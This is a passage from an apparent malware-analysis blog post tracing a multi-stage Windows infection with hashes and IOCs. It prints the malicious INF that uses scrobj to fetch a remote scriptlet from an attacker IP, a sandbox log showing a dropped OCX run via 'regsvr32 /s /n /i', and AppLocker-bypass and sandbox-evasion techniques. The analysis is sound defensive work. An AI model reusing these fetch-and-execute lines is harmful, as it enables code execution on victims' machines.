</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-ini data-lang=ini>
<span class=na>[version]scrObj</span>
<span class=na>2D0D</span><span class=o>=</span><span class=s>01</span>
<span class=k>[defaultinstall_singleuser]</span>
<span class=na>UnRegisterOCXs</span><span class=o>=</span><span class=s>F251A5</span>
<span class=na>delfiles</span><span class=o>=</span><span class=s>2D0D</span>
<span class=k>[F251A5]</span>
<span class=na>%11%\scrObj,NI,http://209.141.61.11/update.txt</span>
<span class=k>[2D0D]</span>
<span class=na>RANDOM.inf</span>
<span class=k>[strings]</span>
<span class=na>UoglocMF5568</span><span class=o>=</span><span class=s>t</span>
<span class=na>UoglocMF2085</span><span class=o>=</span><span class=s>h</span>
<span class=na>UoglocMF54670</span><span class=o>=</span><span class=s>:</span>
<span class=na>UoglocMF7741</span><span class=o>=</span><span class=s>s</span>
<span class=na>UoglocMF92584</span><span class=o>=</span><span class=s>/</span>
<span class=na>UoglocMF37180</span><span class=o>=</span><span class=s>b</span>
<span class=na>UoglocMF0342</span><span class=o>=</span>
<span class=na>servicename</span><span class=o>=</span><span class=s>&#39; &#39;</span>
<span class=na>shortsvcname</span><span class=o>=</span><span class=s>&#39; &#39;&#34;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id=stage-2-updatetxt>Stage 2, update.txt</h2>
<p>Update.txt (Artifact #6 TXT, <code>c7da11e38583d4d8fa0597cc3ac17b24d210b2b59f9c22b1f6f7224a16ea9328</code>, VT 3/59) is only downloadable via the user-agent string that <code>cmstp</code> uses by default, making the analyst&rsquo;s job a bit difficult.</p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/6.jpg title="Empty update.txt when browsing via Firefox" data-thumbnail=/img/malware-applocker-bypass/6.jpg data-sub-html="<h2>Empty update.txt when browsing via Firefox</h2><p>Empty update.txt when browsing via Firefox</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/6.jpg data-srcset="/img/malware-applocker-bypass/6.jpg, /img/malware-applocker-bypass/6.jpg 1.5x, /img/malware-applocker-bypass/6.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/6.jpg>
</a><figcaption class=image-caption>Empty update.txt when browsing via Firefox</figcaption>
</figure></p>
<p>Fortunately, update.txt is downloaded via HTTP so the PCAP file containing <code>update.txt</code> (Artifact #7 PCAP, <code>6b2da53f8bcae0cd99bdae18993bf8d485ac56be33d01af8f18022b9888eebd3</code>, VT N/A) has a lot of information about the request and response:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>GET /update.txt HTTP/1.1
Accept: */*
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)
Via: 1.1 vHNhtcL6WBSNPRD01 0AEC5970 
Host: 209.141.61.11

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 02 Oct 2020 01:33:25 GMT
Content-Type: text/plain
Content-Length: 438034
Connection: keep-alive
Last-Modified: Thu, 27 Aug 2020 15:43:52 GMT
ETag: &#34;5f47d4b8-6af12&#34;
Accept-Ranges: bytes
</code></pre></td></tr></table>
</div>
</div><p>now, <code>update.txt</code> is in our hands. Let&rsquo;s see how it looks like</p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/7.jpg title="update.txt content" data-thumbnail=/img/malware-applocker-bypass/7.jpg data-sub-html="<h2>update.txt content</h2><p>update.txt content</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/7.jpg data-srcset="/img/malware-applocker-bypass/7.jpg, /img/malware-applocker-bypass/7.jpg 1.5x, /img/malware-applocker-bypass/7.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/7.jpg>
</a><figcaption class=image-caption>update.txt content</figcaption>
</figure></p>
<p><code>update.txt</code> looks like a XML <code>scriptlet</code> containing a heavily obfuscated <code>javascript</code> payload. Also, <code>.txt</code> extension won&rsquo;t stop the scriptlet from being executed <a href=https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/ target=_blank rel="noopener noreffer">Reference</a>. There have been similar malware before (<a href="https://twitter.com/DissectMalware/status/988620768702550016?s=20" target=_blank rel="noopener noreffer">Reference</a>) Starting point is here:</p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/8.jpg title="update.txt obfuscated js" data-thumbnail=/img/malware-applocker-bypass/8.jpg data-sub-html="<h2>update.txt JS starting point</h2><p>update.txt obfuscated js</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/8.jpg data-srcset="/img/malware-applocker-bypass/8.jpg, /img/malware-applocker-bypass/8.jpg 1.5x, /img/malware-applocker-bypass/8.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/8.jpg>
</a><figcaption class=image-caption>update.txt JS starting point</figcaption>
</figure></p>
<p>1000+ lines of JS code, with a very interesting-looking char table:</p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/9.jpg title="js char table" data-thumbnail=/img/malware-applocker-bypass/9.jpg data-sub-html="<h2>js char table</h2><p>js char table</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/9.jpg data-srcset="/img/malware-applocker-bypass/9.jpg, /img/malware-applocker-bypass/9.jpg 1.5x, /img/malware-applocker-bypass/9.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/9.jpg>
</a><figcaption class=image-caption>js char table</figcaption>
</figure></p>
<p>After scratching my head for hours on this JS, I finally came up with a way to de-obfuscate some of the malware. Using the awesome project <a href=https://github.com/HynekPetrak/malware-jail target=_blank rel="noopener noreffer">malware-jail</a>, I was able to decode a piece of the malware that could be the next key (Artifact #8, <code>ecd80124a34daf7d8a7a73ee412aabc977313888c8d70c2190b306ed28dc72f9</code>, VT N/A). This leads us to Stage 3 of the malware</p>
<h2 id=stage-3-another-js>Stage 3, another JS</h2>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/11.jpg title="Stage 3 JS" data-thumbnail=/img/malware-applocker-bypass/11.jpg data-sub-html="<h2>Stage 3 JS</h2><p>Stage 3 JS</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/11.jpg data-srcset="/img/malware-applocker-bypass/11.jpg, /img/malware-applocker-bypass/11.jpg 1.5x, /img/malware-applocker-bypass/11.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/11.jpg>
</a><figcaption class=image-caption>Stage 3 JS</figcaption>
</figure></p>
<p>After adding the variables from &ldquo;stage2&rdquo; to &ldquo;stage3&rdquo;, I created the file <code>artifact9.js</code> (Artifact #9, <code>4dbb4755cbe105673725055f090ff830f042e8809c1a708db5c044f93dbcb6b4</code>, VT N/A).nsv</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=nb>set</span> -e
node jailme.js -e env/utils.js -e env/eval.js -e env/function.js -e env/wscript.js -e env/other.js -e env/console.js --down<span class=o>=</span>y ../try2/output.txt.js
cp sandbox_dump_after.json ../try2/output.txt.js-dumpafter
cp output/.._try2_output.txt.js ../try2/output.txt.js-output
cp <span class=s2>&#34;output/Function[5].js&#34;</span> ../try2/Function14.js
sed -i <span class=s1>&#39;s/nvmlxxyx7511.nvmlxxyx539/nvmlxxyx31()/&#39;</span> ../try2/Function14.js
node jailme.js -c ./config.json -e env/utils.js -e env/eval.js -e env/function.js -e env/wscript.js -e env/other.js -e env/console.js  -e ../try2/output.txt.js-output -e ../try2/env-dummy.js --down<span class=o>=</span>y ../try2/Function14.js

</code></pre></td></tr></table>
</div>
</div><p>The output of the script shows a really interesting technique</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>10 Oct 20:22:29 - mailware-jail, a malware sandbox ver. 0.20
10 Oct 20:22:29 - ------------------------
10 Oct 20:22:29 - Arguments: -e env/utils.js -e env/eval.js -e env/function.js -e env/wscript.js -e env/other.js -e env/console.js --down=y ../try2/output.txt.js
10 Oct 20:22:29 - Sandbox environment sequence: env/utils.js,env/eval.js,env/function.js,env/wscript.js,env/other.js,env/console.js
10 Oct 20:22:29 - Malware files: ../try2/output.txt.js
10 Oct 20:22:29 - Execution timeout set to: 60 seconds
10 Oct 20:22:29 - Output file for sandbox dump: sandbox_dump_after.json
10 Oct 20:22:29 - Output directory for generated files: output/
10 Oct 20:22:29 - Download from remote server: Yes
10 Oct 20:22:29 - ==&gt; Preparing Sandbox environment.
10 Oct 20:22:29 -  =&gt; Executing: env/utils.js quitely
10 Oct 20:22:29 -  =&gt; Executing: env/eval.js quitely
10 Oct 20:22:29 -  =&gt; Executing: env/function.js quitely
10 Oct 20:22:29 -  =&gt; Executing: env/wscript.js quitely
10 Oct 20:22:29 -  =&gt; Executing: env/other.js quitely
10 Oct 20:22:29 -  =&gt; Executing: env/console.js quitely
10 Oct 20:22:29 - ==&gt; Executing malware file(s). =========================================
10 Oct 20:22:29 -  =&gt; Executing: ../try2/output.txt.js verbosely, reporting silent catches
10 Oct 20:22:29 - Saving: output/.._try2_output.txt.js
10 Oct 20:22:29 - Saving: output/tr_.._try2_output.txt.js
10 Oct 20:22:29 - WScript.scriptfullname = (string) &#39;../try2/output.txt.js&#39;
10 Oct 20:22:29 - WScript.arguments = (object) &#39;../try2/output.txt.js,xyz&#39;
10 Oct 20:22:29 - new Function(function nvmlxxyx81(nvmlxxyx177) {return nvmlxxyx177.length;}function nvmlxxyx6715(nvmlxxyx5611){return String.fromCharCode(nvmlxxyx5611);}function nvmlxxyx5562(nvmlxxyx1564) {var nvmlxxyx3607 = [];var nvmlxxyx1688 = [];var nvmlxxyx4682 = &#34;&#34;;var nvml ... (truncated)) =&gt; Function[5]
10 Oct 20:22:29 - Calling Function[5]() on sandbox
10 Oct 20:22:29 - Returning: &#39;undefined&#39;
10 Oct 20:22:29 - ==&gt; Cleaning up sandbox.
10 Oct 20:22:29 - ==&gt; Script execution finished, dumping sandbox environment to a file.
10 Oct 20:22:29 - The sandbox context has been  saved to: sandbox_dump_after.json
10 Oct 20:22:29 - Saving: output/Function[5].js
10 Oct 20:22:29 - mailware-jail, a malware sandbox ver. 0.20
10 Oct 20:22:29 - ------------------------
10 Oct 20:22:29 - Arguments: -c ./config.json -e env/utils.js -e env/eval.js -e env/function.js -e env/wscript.js -e env/other.js -e env/console.js -e ../try2/output.txt.js-output -e ../try2/env-dummy.js --down=y ../try2/Function14.js
10 Oct 20:22:29 - Sandbox environment sequence: env/utils.js,env/eval.js,env/function.js,env/wscript.js,env/other.js,env/console.js,../try2/output.txt.js-output,../try2/env-dummy.js
10 Oct 20:22:29 - Malware files: ../try2/Function14.js
10 Oct 20:22:29 - Execution timeout set to: 60 seconds
10 Oct 20:22:29 - Output file for sandbox dump: sandbox_dump_after.json
10 Oct 20:22:29 - Output directory for generated files: output/
10 Oct 20:22:29 - Download from remote server: Yes
10 Oct 20:22:29 - ==&gt; Preparing Sandbox environment.
10 Oct 20:22:29 -  =&gt; Executing: env/utils.js quitely
10 Oct 20:22:29 -  =&gt; Executing: env/eval.js quitely
10 Oct 20:22:29 -  =&gt; Executing: env/function.js quitely
10 Oct 20:22:29 -  =&gt; Executing: env/wscript.js quitely
10 Oct 20:22:29 -  =&gt; Executing: env/other.js quitely
10 Oct 20:22:29 -  =&gt; Executing: env/console.js quitely
10 Oct 20:22:29 -  =&gt; Executing: ../try2/output.txt.js-output quitely
10 Oct 20:22:29 -  =&gt; Executing: ../try2/env-dummy.js quitely
10 Oct 20:22:29 - ==&gt; Executing malware file(s). =========================================
10 Oct 20:22:29 -  =&gt; Executing: ../try2/Function14.js verbosely, reporting silent catches
10 Oct 20:22:29 - Saving: output/.._try2_Function14.js
10 Oct 20:22:29 - Saving: output/tr_.._try2_Function14.js
10 Oct 20:22:29 - WScript.scriptfullname = (string) &#39;../try2/Function14.js&#39;
10 Oct 20:22:29 - WScript.arguments = (object) &#39;../try2/Function14.js,xyz&#39;
10 Oct 20:22:29 - ActiveXObject(WScript.Shell)
10 Oct 20:22:29 - new WScript.Shell[6]
10 Oct 20:22:29 - new WshEnvironment[7](PROCESS)
10 Oct 20:22:29 - WScript.Shell[6].Environment(PROCESS)
10 Oct 20:22:29 - WshEnvironment[7](PROCESS)(APPDATA) =&gt; C:\Users\User\AppData\Roaming
10 Oct 20:22:29 - ActiveXObject(ADODB.Stream)
10 Oct 20:22:29 - new ADODB_Stream[8]
10 Oct 20:22:29 - ADODB_Stream[8].Open()
10 Oct 20:22:29 - ADODB_Stream[8].position = (number) &#39;0&#39;
10 Oct 20:22:29 - ADODB_Stream[8].type = (number) &#39;2&#39;
10 Oct 20:22:29 - ADODB_Stream[8].charset = (number) &#39;437&#39;
10 Oct 20:22:29 - ADODB_Stream[8].type.get() =&gt; (number) &#39;2&#39;
10 Oct 20:22:29 - ADODB_Stream[8].charset.get() =&gt; (number) &#39;437&#39;
10 Oct 20:22:29 - ADODB_Stream[8].charset.get() =&gt; (number) &#39;437&#39;
10 Oct 20:22:29 - ADODB_Stream[8].content = (object) &#39;??????????????????????&gt;???????????????????????&#39;???????????)???????????????&amp;??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? ... (truncated)&#39;
10 Oct 20:22:29 - ADODB_Stream[8].charset.get() =&gt; (number) &#39;437&#39;
10 Oct 20:22:29 - ADODB_Stream[8].WriteText(str) - 23040 bytes, encoding: 437
10 Oct 20:22:29 - ADODB_Stream[8].content.get() =&gt; (object) &#39;??????????????????????&gt;???????????????????????&#39;???????????)???????????????&amp;??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? ... (truncated)&#39;
10 Oct 20:22:29 - ADODB_Stream[8].size = (number) &#39;23040&#39;
10 Oct 20:22:29 - ADODB_Stream[8].SaveToFile(C:\Users\User\AppData\Roaming\Microsoft\17939.doc, undefined)
10 Oct 20:22:29 - ADODB_Stream[8].content.get() =&gt; (object) &#39;??????????????????????&gt;???????????????????????&#39;???????????)???????????????&amp;??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? ... (truncated)&#39;
10 Oct 20:22:29 - ADODB_Stream[8].Close()
10 Oct 20:22:29 - GetObject(winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2, undefined)
10 Oct 20:22:29 - new AutomationObject[9](winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2, undefined)
10 Oct 20:22:29 - ActiveXObject(WScript.Shell)
10 Oct 20:22:29 - new WScript.Shell[10]
10 Oct 20:22:29 - FIXME: WScript.Shell[10].RegRead(HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe\) - unknown key
10 Oct 20:22:29 - WScript.Shell[10].RegRead(HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe\) =&gt; undefined
10 Oct 20:22:29 - &gt;&gt;&gt; FIXME: AutomationObject[9](winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2, undefined)[Get] not defined
10 Oct 20:22:29 - &gt;&gt;&gt; Silencing catch TypeError: nvmlxxyx3818.Get is not a function
    at nvmlxxyx31 (../try2/Function14.js:1:6806)
    at nvmlxxyx9727 (../try2/Function14.js:1:5108)
    at ../try2/Function14.js:1:8094
    at Script.runInContext (vm.js:142:18)
    at Object.runInContext (vm.js:293:6)
    at run_in_ctx (jailme.js:324:16)
    at Object.&lt;anonymous&gt; (jailme.js:359:20)
    at Module._compile (internal/modules/cjs/loader.js:1063:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1092:10)
    at Module.load (internal/modules/cjs/loader.js:928:32)
10 Oct 20:22:29 - WScript.Shell[6].Run(&#34;C:\Users\User\AppData\Roaming\Microsoft\17939.doc&#34;, 1, 0)
10 Oct 20:22:30 - ActiveXObject(ADODB.Stream)
10 Oct 20:22:30 - new ADODB_Stream[11]
10 Oct 20:22:30 - ADODB_Stream[11].Open()
10 Oct 20:22:30 - ADODB_Stream[11].position = (number) &#39;0&#39;
10 Oct 20:22:30 - ADODB_Stream[11].type = (number) &#39;2&#39;
10 Oct 20:22:30 - ADODB_Stream[11].charset = (number) &#39;437&#39;
10 Oct 20:22:30 - ADODB_Stream[11].type.get() =&gt; (number) &#39;2&#39;
10 Oct 20:22:30 - ADODB_Stream[11].charset.get() =&gt; (number) &#39;437&#39;
10 Oct 20:22:30 - ADODB_Stream[11].charset.get() =&gt; (number) &#39;437&#39;
10 Oct 20:22:30 - ADODB_Stream[11].content = (object) &#39;MZ??????????????????????@???????????????????????????????????????????????!??L?!This program cannot be run in DOS mode.???$???????PE??L???R??^???????????!???2???????????????????????????????????????????????????????????????????????????????????????????? ? ... (truncated)&#39;
10 Oct 20:22:30 - ADODB_Stream[11].charset.get() =&gt; (number) &#39;437&#39;
10 Oct 20:22:30 - ADODB_Stream[11].WriteText(str) - 300546 bytes, encoding: 437
10 Oct 20:22:30 - ADODB_Stream[11].content.get() =&gt; (object) &#39;MZ??????????????????????@???????????????????????????????????????????????!??L?!This program cannot be run in DOS mode.???$???????PE??L???R??^???????????!???2???????????????????????????????????????????????????????????????????????????????????????????? ? ... (truncated)&#39;
10 Oct 20:22:30 - ADODB_Stream[11].size = (number) &#39;300546&#39;
10 Oct 20:22:30 - ADODB_Stream[11].SaveToFile(C:\Users\User\AppData\Roaming\Microsoft\4242.ocx, undefined)
10 Oct 20:22:30 - ADODB_Stream[11].content.get() =&gt; (object) &#39;MZ??????????????????????@???????????????????????????????????????????????!??L?!This program cannot be run in DOS mode.???$???????PE??L???R??^???????????!???2???????????????????????????????????????????????????????????????????????????????????????????? ? ... (truncated)&#39;
10 Oct 20:22:30 - ADODB_Stream[11].Close()
10 Oct 20:22:30 - GetObject(winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2, undefined)
10 Oct 20:22:30 - new AutomationObject[12](winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2, undefined)
10 Oct 20:22:30 - &gt;&gt;&gt; FIXME: AutomationObject[12](winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2, undefined)[Get] not defined
10 Oct 20:22:30 - &gt;&gt;&gt; Silencing catch TypeError: nvmlxxyx4469.Get is not a function
    at nvmlxxyx31 (../try2/Function14.js:1:7698)
    at nvmlxxyx9727 (../try2/Function14.js:1:5108)
    at ../try2/Function14.js:1:8094
    at Script.runInContext (vm.js:142:18)
    at Object.runInContext (vm.js:293:6)
    at run_in_ctx (jailme.js:324:16)
    at Object.&lt;anonymous&gt; (jailme.js:359:20)
    at Module._compile (internal/modules/cjs/loader.js:1063:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1092:10)
    at Module.load (internal/modules/cjs/loader.js:928:32)
10 Oct 20:22:30 - WScript.Shell[6].Run(regsvr32 /s /n /i &#34;C:\Users\User\AppData\Roaming\Microsoft\4242.ocx&#34;, 1, 0)
10 Oct 20:22:30 - ==&gt; Cleaning up sandbox.
10 Oct 20:22:30 - ==&gt; Script execution finished, dumping sandbox environment to a file.
10 Oct 20:22:30 - The sandbox context has been  saved to: sandbox_dump_after.json
10 Oct 20:22:30 - Saving: output/Function[5].js
10 Oct 20:22:30 - Saving: output/C__Users_User_AppData_Roaming_Microsoft_17939.doc
10 Oct 20:22:30 - Saving: output/C__Users_User_AppData_Roaming_Microsoft_4242.ocx
</code></pre></td></tr></table>
</div>
</div><p><a href=https://car.mitre.org/analytics/CAR-2019-04-003/ target=_blank rel="noopener noreffer">CAR-2019-04-003: Squiblydoo</a> talks about the usage of <code>regsvr32</code>, this malware also uses <code>regsvr32 /s /n /i "C:\Users\User\AppData\Roaming\Microsoft\4242.ocx</code> to avoid defense inside the machine (MITRE ATT&CK T1218.010).</p>
<p>The <code>doc</code> file (Artifact #11, <code>ce638eb65e8e8a54becb218f05ba0aadbaded36fc0152591dc3e62b080c46c85</code>, VT N/A) is a nifty little misdirect too. The Word document is not malicious at all and it&rsquo;s mostly empty.</p>
<p>The <code>ocx</code> file (Artifact #10, <code>229b5cc70f69beb555d787c626674946902307546f266ac7c97a17937f1e6510</code>, VT 3/68) marks the Stage 4 of this Malware. Interesting that this file tries to impersonate a popular legitimate SSH client software&rsquo;s DLL:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>File Version Information
Copyright	Copyright (C) 2000-2020 by Bitvise Limited.
Product	Bitvise SSH Client
Description	Bitvise SSH Client Title Helper for Remote Desktop
Original Name	MstscTitle32.dll
Internal Name	MstscTitleDll
File Version	8.38.0.0
</code></pre></td></tr></table>
</div>
</div><p>in the midst of <code>ocx</code> file being implemented and executed, the malware also creates a VPN profile named <code>Yay</code> in the victim&rsquo;s machine. The VPN does not have a destination connection IP so presumably this profile will come in play in the later stages of execution.</p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/13.jpg title="VPN Profile" data-thumbnail=/img/malware-applocker-bypass/13.jpg data-sub-html="<h2>Yay VPN</h2><p>VPN Profile</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/13.jpg data-srcset="/img/malware-applocker-bypass/13.jpg, /img/malware-applocker-bypass/13.jpg 1.5x, /img/malware-applocker-bypass/13.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/13.jpg>
</a><figcaption class=image-caption>Yay VPN</figcaption>
</figure></p>
<p>The connection profile file is captured under Artifact #12 (<code>a0c2b522a86e729467d27cf98bd3c9a5264ebc1e1d5113d2bf2040423578d66b</code>, VT N/A).</p>
<h2 id=stage-5-brand-new-xml-and-a-c2>Stage 5, brand new XML and a C2!</h2>
<p>the <code>ocx</code> run will run for 7+ minutes without showing any sign of activity, presumably to ensure any regular sandbox times out. For example, <code>any.run</code>&rsquo;s free plan is limited to 60 sec, SEARCHER plan is 360 sec and HUNTER is 660 sec, so this is a very simple and effective way to avoid detection by sandbox apps.</p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/12.jpg title="ocx run" data-thumbnail=/img/malware-applocker-bypass/12.jpg data-sub-html="<h2>Runtime</h2><p>ocx run</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/12.jpg data-srcset="/img/malware-applocker-bypass/12.jpg, /img/malware-applocker-bypass/12.jpg 1.5x, /img/malware-applocker-bypass/12.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/12.jpg>
</a><figcaption class=image-caption>Runtime</figcaption>
</figure></p>
<p>After minutes of being idle, the malware drops the file <code>msxsl.exe</code> into <code>C:\Users\User\AppData\Roaming\Microsoft\msxsl.exe</code> (Artifact #13, <code>35ba7624f586086f32a01459fcc0ab755b01b49d571618af456aa49e593734c7</code>, VT 0). This binary is a legitimate, signed one offered by Microsoft. According to Microsoft:</p>
<p>The msxsl.exe command line utility enables you to perform command line Extensible Stylesheet Language (XSL) transformations using the Microsoft® XSL processor.</p>
<p>In the meantime, two new .txt files are dropped to <code>C:\Users\User\AppData\Roaming\Microsoft\</code>, and they will be executed by <code>msxls</code>:</p>
<ul>
<li><code>2A6A259B2F94150FF85A0B3.txt</code>, Artifact #14, <code>28141035e19e63f051f4634ba1b00074a272c6e7af73f736de76859d69e49e86</code>, VT N/A</li>
<li><code>71202A1F233A4A603.txt</code>, Artifact #15, <code>31e6d6d746c53438670f2f2944320a94cbaf8f7df37a01a21fbd08c6c05ed48c</code>, VT N/A</li>
</ul>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/14.jpg title="msXSL running the payload" data-thumbnail=/img/malware-applocker-bypass/14.jpg data-sub-html="<h2>MSXSL running the payload</h2><p>msXSL running the payload</p>">
<img class=lazyload src=/svg/loading.min.svg data-src=/img/malware-applocker-bypass/14.jpg data-srcset="/img/malware-applocker-bypass/14.jpg, /img/malware-applocker-bypass/14.jpg 1.5x, /img/malware-applocker-bypass/14.jpg 2x" data-sizes=auto alt=/img/malware-applocker-bypass/14.jpg>
</a><figcaption class=image-caption>MSXSL running the payload</figcaption>
</figure></p>
<h3 id=c2-start-beaconing>C2 start Beaconing</h3>
<p>The first packet that we see after <code>msxls</code> runs is a PTR query to (IOC) <code>209.141.59.48</code></p>
<p><figure><a class=lightgallery href=/img/malware-applocker-bypass/15.jpg title="beacon PTR" data-thumbnail=/img/malware-applocker-bypass/15.jpg data-sub-html="<h2>beacon PTR</h2><p>beacon PTR</p>">
